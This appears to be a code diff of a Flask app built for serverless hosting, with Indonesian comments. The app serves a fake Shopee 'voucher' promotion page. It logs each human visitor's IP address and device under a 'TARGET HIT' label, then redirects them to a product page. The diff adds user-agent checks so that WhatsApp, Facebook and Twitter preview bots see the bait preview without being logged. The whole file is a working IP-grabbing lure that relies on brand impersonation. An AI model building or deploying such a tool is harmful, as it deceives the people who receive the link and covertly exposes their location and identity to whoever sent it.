@@ -1,43 +1,47 @@
-from flask import Flask, request, render_template_string, redirect
+from flask import Flask, request, render_template_string
 
 app = Flask(__name__)
 
-# --- KONFIGURASI ---
-# Ganti dengan link gambar produk Shopee yang meyakinkan
-IMAGE_URL = "https://upload.wikimedia.org/wikipedia/commons/thumb/f/fe/Shopee.svg/1200px-Shopee.svg.png" 
-# Ganti dengan link tujuan (Produk Shopee Asli)
-TARGET_URL = "https://www.tokopedia.com/studioponsel/apple-macbook-air-m4-2025-13-inch-24-512gb-16-512gb-10-core-gpu-16-256gb-8-core-gpu-1730970954041230655?extParam=ivf%3Dfalse%26keyword%3Dmacbook+m4%26search_id%3D20251213173041C5FF2543B53F4C1C1ASB%26src%3Dsearch&t_id=1765647049167&t_st=1&t_pp=search_result&t_efo=search_pure_goods_card&t_ef=goods_search&t_sm=&t_spt=search_result" 
+# --- CONFIG GAMBAR (PAKE INI DULU BIAR PASTI MUNCUL) ---
+# Kita pakai gambar statis Wikipedia dulu untuk tes, karena servernya cepat.
+# Nanti kalau sudah sukses, baru ganti link gambar lain.
+IMAGE_URL = "https://upload.wikimedia.org/wikipedia/commons/9/9a/Logo-Tokopedia.png"
+TARGET_URL = "https://www.tokopedia.com/studioponsel/apple-macbook-air-m4-2025-13-inch-24-512gb-16-512gb-10-core-gpu-16-256gb-8-core-gpu-1730970954041230655?extParam=ivf%3Dfalse%26keyword%3Dmacbook+m4%26search_id%3D20251213173041C5FF2543B53F4C1C1ASB%26src%3Dsearch&t_id=1765647049167&t_st=1&t_pp=search_result&t_efo=search_pure_goods_card&t_ef=goods_search&t_sm=&t_spt=search_result"
 
-# --- TEMPLATE HTML (DISAMARKAN) ---
 HTML_TEMPLATE = """
 <!DOCTYPE html>
-<html lang="id">
+<html lang="id" prefix="og: http://ogp.me/ns#">
 <head>
     <meta charset="UTF-8">
-    <title>Shopee Murah Lebay</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <meta property="og:site_name" content="Shopee Indonesia">
-    <meta property="og:title" content="Promo Flash Sale - Diskon 90%">
-    <meta property="og:description" content="Stok terbatas! Klik untuk klaim voucher sekarang.">
-    <meta property="og:image" content="{{ image_url }}">
-    <meta property="twitter:card" content="summary_large_image">
+    <title>Shopee Big Sale</title>
+    <meta name="description" content="Diskon 99% Khusus Hari Ini.">
+
+    <meta property="og:site_name" content="Shopee">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Kejutan Shopee - Voucher 500rb">
+    <meta property="og:description" content="Klik untuk klaim sebelum hangus.">
+    <meta property="og:image" content="{{ image }}">
+    <meta property="og:image:width" content="600">
+    <meta property="og:image:height" content="315">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="{{ image }}">
 
     <style>
-        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #f5f5f5; text-align: center; padding-top: 100px; }
-        .spinner { margin: 0 auto; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #ee4d2d; border-radius: 50%; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        p { color: #666; margin-top: 20px; font-size: 14px; }
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #f0f0f0; }
+        .msg { color: #555; font-size: 14px; }
     </style>
 </head>
 <body>
-    <div class="spinner"></div>
-    <p>Memuat halaman produk...</p>
-
+    <p class="msg">Sedang memuat...</p>
+    
     <script>
-        // Redirect otomatis setelah 1.5 detik
-        setTimeout(function() {
-            window.location.href = "{{ target_url }}";
-        }, 1500);
+        // Redirect setelah 1 detik
+        setTimeout(function(){
+            window.location.href = "{{ target }}";
+        }, 1000);
     </script>
 </body>
 </html>
@@ -45,17 +49,21 @@ HTML_TEMPLATE = """
 
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>')
-def catch_all(path):
-    # 1. LOGGING IP
-    # Vercel menggunakan header x-forwarded-for untuk IP asli
-    user_ip = request.headers.get('x-forwarded-for', request.remote_addr)
-    user_agent = request.headers.get('User-Agent')
+def handler(path):
+    # Cek User Agent
+    user_agent = request.headers.get('User-Agent', '').lower()
     
-    # Print ke Log Vercel (Ini yang nanti Anda cek)
-    print(f"!!! TARGET TERLACAK !!! IP: {user_ip} | Device: {user_agent}")
+    # Deteksi Bot WhatsApp / Facebook
+    is_bot = "facebookexternalhit" in user_agent or "whatsapp" in user_agent or "twitterbot" in user_agent
 
-    # 2. TAMPILKAN HALAMAN PANCINGAN
-    return render_template_string(HTML_TEMPLATE, image_url=IMAGE_URL, target_url=TARGET_URL)
-
-# Handler untuk Vercel Serverless
-# Tidak perlu app.run()
+    if is_bot:
+        # Jika BOT: Jangan catat IP, langsung kasih HTML biar cepat (Preview muncul)
+        return render_template_string(HTML_TEMPLATE, image=IMAGE_URL, target=TARGET_URL)
+    
+    else:
+        # Jika MANUSIA: Catat IP
+        user_ip = request.headers.get('x-forwarded-for', request.remote_addr)
+        print(f"!!! TARGET HIT !!! IP: {user_ip} | UA: {user_agent}")
+        
+        # Tampilkan halaman yang akan me-redirect
+        return render_template_string(HTML_TEMPLATE, image=IMAGE_URL, target=TARGET_URL)
